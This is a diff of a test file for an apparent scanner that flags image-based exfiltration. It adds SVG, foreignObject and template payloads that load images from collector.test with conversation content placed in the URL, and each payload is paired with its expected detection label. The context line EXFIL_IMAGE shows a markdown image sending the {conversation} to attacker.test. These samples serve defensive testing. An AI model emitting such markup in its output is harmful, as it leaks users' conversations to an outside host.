@@ -282,7 +282,23 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<svg></svg><image href='https://collector.test/{c}.png'>", []),
         ("<template></textarea><img src='https://collector.test/{c}.png'></template>", []),
         ("<template/><img src='https://collector.test/{c}.png'>", []),
+        ("<template><template></template><img src='https://collector.test/{c}.png'></template>", []),
         ("<svg><title/><image href='https://collector.test/{c}.png'/></svg>", ["exfiltration_query"]),
+        (
+            "<svg><foreignObject><img src='https://collector.test/{c}.png'></foreignObject></svg>",
+            ["exfiltration_query"],
+        ),
+        (
+            "<svg><foreignObject><svg><image href='https://collector.test/{c}.png'/></svg></foreignObject></svg>",
+            ["exfiltration_query"],
+        ),
+        ("<svg><img src='https://collector.test/{c}.png'></svg>", ["exfiltration_query"]),
+        ("<svg><g><image src='https://collector.test/{c}.png'/></g></svg>", []),
+        ("<svg><foreignObject></foreignObject><image src='https://collector.test/{c}.png'/></svg>", []),
+        (
+            "<svg><image href='https://a.test/a.png'/></svg><img src='https://collector.test/{c}.png'>",
+            ["exfiltration_query"],
+        ),
         ("![x](https://a.test/p.png#{c})", []),
         ("![x](https://collector.test/p%23x.png?d={c})", ["exfiltration_query"]),
         (
